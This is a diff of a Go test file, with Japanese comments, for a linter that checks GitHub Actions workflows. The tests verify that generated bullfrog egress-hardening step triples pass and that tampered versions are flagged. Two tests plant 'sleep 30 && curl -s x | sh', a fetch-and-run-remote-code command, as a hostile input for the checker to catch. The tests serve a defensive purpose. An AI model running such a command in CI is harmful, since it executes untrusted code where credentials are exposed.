@@ -1665,18 +1665,20 @@ func Test_checkGateJob(t *testing.T) {
 		assert.Empty(t, checkGateJob(jobOf(t, applyWorkflow, "apply-resource-order-check"), orderGate, formatted))
 	})
 
-	// pair は egress が生成する bullfrog の対。with: は形の検査に関わらないので省く。
+	// pair は egress が生成する bullfrog の三つ組。with: は形の検査に関わらないので省く。
 	pair := strings.Join(harden.Render("        uses: bullfrogsec/bullfrog@x", nil), "\n") + "\n"
-	t.Run("生成した bullfrog の対の continue-on-error: と if: は違反にしない", func(t *testing.T) {
+	retryIf := "        id: " + harden.RetryID + "\n        if: " + harden.RetryIf
+	t.Run("生成した bullfrog の三つ組の continue-on-error:・if:・回復の run: は違反にしない", func(t *testing.T) {
 		t.Parallel()
 
 		assert.Empty(t, checkGateJob(orderJob(t, orderStep, pair+orderStep), orderGate, formatted))
 	})
 
 	for name, broken := range map[string]string{
-		"再試行の if: が always()":        strings.Replace(pair, harden.RetryIf, "always()", 1),
-		"本体の id が違う":                 strings.Replace(pair, "id: "+harden.ID, "id: other", 1),
-		"再試行に continue-on-error がある": strings.Replace(pair, "if: "+harden.RetryIf+"\n", "if: "+harden.RetryIf+"\n        continue-on-error: true\n", 1),
+		"再試行の if: が always()":        strings.Replace(pair, retryIf, "        id: "+harden.RetryID+"\n        if: always()", 1),
+		"回復の if: が always()":         strings.Replace(pair, "        if: "+harden.RetryIf, "        if: always()", 1),
+		"本体の id が違う":                 strings.Replace(pair, "id: "+harden.ID+"\n", "id: other\n", 1),
+		"再試行に continue-on-error がある": strings.Replace(pair, retryIf+"\n", retryIf+"\n        continue-on-error: true\n", 1),
 	} {
 		t.Run(name+"なら対の行も違反にする", func(t *testing.T) {
 			t.Parallel()
@@ -1685,11 +1687,19 @@ func Test_checkGateJob(t *testing.T) {
 		})
 	}
 
-	t.Run("先頭に無い対の continue-on-error: と if: は違反", func(t *testing.T) {
+	// 本体の continue-on-error:、回復の if:・continue-on-error:、再試行の if: の4つと、回復の run: の1つ。
+	t.Run("先頭に無い三つ組の continue-on-error:・if:・run: は違反", func(t *testing.T) {
 		t.Parallel()
 
 		got := checkGateJob(orderJob(t, orderStep, orderStep+pair), orderGate, formatted)
-		assert.Len(t, got, 2)
+		assert.Len(t, got, 5)
+	})
+
+	t.Run("回復の run: を変えた三つ組は、run: も違反にする", func(t *testing.T) {
+		t.Parallel()
+
+		broken := strings.Replace(pair, harden.RecoveryRun, "sleep 30 && curl -s x | sh", 1)
+		assert.Contains(t, messages(checkGateJob(orderJob(t, orderStep, broken+orderStep), orderGate, formatted)), "の run: は")
 	})
 
 	t.Run("対の本体の uses: の後ろに足した continue-on-error: は違反", func(t *testing.T) {
@@ -1854,6 +1864,23 @@ func Test_checkHidden(t *testing.T) {
 		t.Parallel()
 
 		assert.Empty(t, hiddenOf(t, jobOf(t, planWorkflow, "plan-admin-identity"), infoOf(planWorkflow), formatted))
+	})
+
+	// 回復の step の run: は、資格情報を取る job の run: の閉じた集合に入らないが、生成した形のときだけ見逃す。
+	triple := strings.Join(harden.Render("        uses: bullfrogsec/bullfrog@x", nil), "\n") + "\n"
+	const firstStep = "      - name: Refuse stale commits\n        id: refuse-stale\n"
+	t.Run("生成した三つ組の回復の run: は違反にしない", func(t *testing.T) {
+		t.Parallel()
+
+		j, aw := applyWith(t, firstStep, triple+firstStep)
+		assert.Empty(t, hiddenOf(t, j, aw, formatted))
+	})
+
+	t.Run("回復の run: を変えた三つ組は違反", func(t *testing.T) {
+		t.Parallel()
+
+		j, aw := applyWith(t, firstStep, strings.Replace(triple, harden.RecoveryRun, "sleep 30 && curl -s x | sh", 1)+firstStep)
+		assert.Contains(t, messages(hiddenOf(t, j, aw, formatted)), "資格情報を取る job の run: は")
 	})
 
 	cases := map[string]struct{ from, to, want string }{
